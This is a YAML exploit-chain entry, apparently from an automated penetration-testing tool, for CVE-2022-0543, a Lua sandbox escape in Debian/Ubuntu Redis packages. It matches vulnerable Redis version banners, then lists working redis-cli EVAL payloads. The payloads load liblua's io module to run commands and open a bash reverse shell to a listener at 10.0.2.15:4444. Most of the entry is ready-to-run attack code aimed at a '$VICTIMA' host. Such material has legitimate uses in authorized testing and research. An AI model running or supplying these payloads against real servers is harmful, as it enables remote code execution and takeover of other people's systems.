chain_id: redis_lua_sandbox_cve_2022_0543
title: "Redis — CVE-2022-0543 Lua sandbox escape (Debian/Ubuntu redis-server)"
severity: CRITICAL
tags: [redis, cve-2022-0543, lua, sandbox-escape, rce]

trigger:
  any_of:
    - { product_pattern: "(?i)redis.*(5\\.|6\\.0|6\\.2)" }
    - { banner_pattern: "(?i)redis_version:(5\\.|6\\.0|6\\.2)" }

description: |
  CVE-2022-0543 is a Lua sandbox escape unique to Debian / Ubuntu
  packaging of Redis (<= 5.0.7-3, <= 6.0.16-1, <= 6.2.6-3): the
  package builds Redis dynamically against system Lua, leaving the
  `package` global accessible from `eval`. Redis 7.x ships fixed.

steps:
  - id: 1
    title: "Confirm Redis responds + version"
    command: redis-cli -h $VICTIMA INFO server | head

  - id: 2
    title: "Drop into Lua and require os.execute"
    command: |
      redis-cli -h $VICTIMA EVAL 'local io_l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io=io_l(); local f=io.popen("id","r"); local res=f:read("*a"); f:close(); return res' 0

  - id: 3
    title: "Reverse shell"
    command: |
      nc -lvnp 4444
      redis-cli -h $VICTIMA EVAL 'local io_l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io=io_l(); local f=io.popen("bash -c \"bash -i >\\&/dev/tcp/10.0.2.15/4444 0>\\&1\""); f:close(); return ""' 0

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0543
